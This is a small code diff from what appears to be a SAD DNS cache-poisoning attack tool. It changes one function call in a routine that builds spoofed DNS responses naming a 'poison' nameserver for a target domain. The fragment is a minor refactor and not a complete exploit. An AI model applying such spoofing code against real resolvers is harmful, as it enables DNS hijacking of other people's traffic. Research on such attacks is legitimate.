@@ -84,7 +84,7 @@ bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
     authori[0] = new_dns_answer_ns(task_args->domain_name, task_args->poison_ns_name, RES_TTL);
 
     uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
-    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, authori, 1, TRUE);
+    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, authori, 1, NULL, 0, TRUE);
 
     uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
     size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
